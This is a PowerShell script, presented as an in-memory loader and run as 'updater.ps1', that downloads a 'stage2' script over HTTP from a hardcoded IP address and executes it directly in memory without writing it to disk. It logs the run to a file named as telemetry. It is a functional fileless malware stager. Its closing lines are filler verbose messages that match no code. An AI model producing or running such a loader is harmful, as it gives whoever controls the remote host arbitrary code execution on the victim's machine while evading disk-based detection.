
<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://198.51.100.84/stage2.ps1",
    [string]$ActivityLog = "$env:TEMP\telemetry.json",
    [int]$RequestTimeout = 64
)
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 64
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    param(
        [string]$ScriptBody = ''
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $RemoteScript = Get-StageScriptText -SourceUrl $RemoteUrl -TimeoutSec $RequestTimeout
    $ResultObject = Invoke-Stage2Script -ScriptBody $RemoteScript
    Write-Verbose "Stage result: $($ResultObject)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $RemoteUrl
    ScriptLength = $RemoteScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Stage handoff finished"
Write-Verbose "Retry budget remaining"
Write-Verbose "Reading configuration values"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Starting workflow"
Write-Verbose "Preparing working directory"
Write-Verbose "Inspecting process list"
Write-Verbose "Applying operation timeout"
Write-Verbose "Exporting operation report"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
